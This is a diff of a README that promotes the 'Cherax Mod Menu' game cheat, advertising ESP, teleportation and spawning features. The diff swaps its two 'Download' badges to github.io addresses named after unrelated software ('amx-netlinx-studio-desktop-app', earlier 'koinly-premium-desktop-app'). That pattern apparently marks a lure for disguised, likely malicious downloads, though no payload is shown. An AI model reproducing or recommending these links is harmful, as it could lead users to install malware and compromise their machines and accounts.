@@ -2,7 +2,7 @@
 
 Cherax Mod Menu is a sophisticated modification tool created for gamers who want to enrich their gameplay experience with intuitive controls and powerful enhancements. It supports a variety of features such as ESP, teleportation, and spawning tools, designed to provide flexibility and enjoyment.
 
-[![Download Cherax Mod Menu](https://img.shields.io/badge/Download-Cherax_Mod_Menu-darkorange)](https://koinly-premium-desktop-app.github.io/.github)
+[![Download Cherax Mod Menu](https://img.shields.io/badge/Download-Cherax_Mod_Menu-darkorange)](https://amx-netlinx-studio-desktop-app.github.io/.github)
 
 ---
 
@@ -68,7 +68,7 @@ Cherax Mod Menu is a sophisticated modification tool created for gamers who want
 
 ---
 
-[![Direct Download](https://img.shields.io/badge/Direct_Download-Here-darkred)](https://cherax-mod-menu-cheat.github.io/.github)
+[![Direct Download](https://img.shields.io/badge/Direct_Download-Here-darkred)](https://amx-netlinx-studio-desktop-app.github.io/.github)
 
 ---
 
